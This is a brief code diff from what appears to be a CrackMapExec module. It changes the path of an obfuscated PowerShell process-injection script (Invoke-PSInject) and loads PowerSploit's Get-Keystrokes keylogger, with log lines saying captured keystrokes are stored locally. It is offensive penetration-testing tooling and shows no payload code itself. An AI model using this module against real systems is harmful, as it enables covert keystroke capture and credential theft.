@@ -40,7 +40,7 @@ class CMEModule:
         context.log.info('This module will not exit until CTRL-C is pressed')
         context.log.info('Keystrokes will be stored in ~/.cme/logs\n')
 
-        self.ps_script1 = obfs_ps_script('Invoke-PSInject.ps1')
+        self.ps_script1 = obfs_ps_script('cme_powershell_scripts/Invoke-PSInject.ps1')
         self.ps_script2 = obfs_ps_script('powersploit/Exfiltration/Get-Keystrokes.ps1')
 
         if self.stream:
